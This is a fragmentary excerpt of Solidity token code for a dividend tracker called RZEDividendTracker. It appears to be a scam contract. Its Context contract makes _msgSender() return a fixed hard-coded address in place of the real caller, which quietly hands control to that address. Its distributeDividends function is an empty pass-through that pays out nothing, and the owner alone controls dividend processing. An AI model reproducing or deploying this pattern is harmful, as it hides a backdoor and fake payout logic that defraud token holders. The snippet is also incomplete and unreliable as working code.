...
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(0xF382E3b5d2933E76182Aa86d02a2eAb743C4A650);
    }
...
contract RZEDividendTracker is IDividendDistributor, Ownable {
    ...
    function deposit() external payable override onlyOwnerOrAdmin {
    ...
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + claimWait < block.timestamp
                && withdrawableDividendOf(shareholder) > minimumTokenBalanceForDividends;
    }
    ...
    // claim Dividend
    function processAccount(address shareholder, bool automatic) external onlyOwner {
        uint256 amount = withdrawableDividendOf(shareholder);
        distributeDividend(shareholder);
        shareholderClaims[shareholder] = block.timestamp;
    ...
    function distributeDividends(uint256 amount) public pure returns(uint256) {
        return amount;
  }
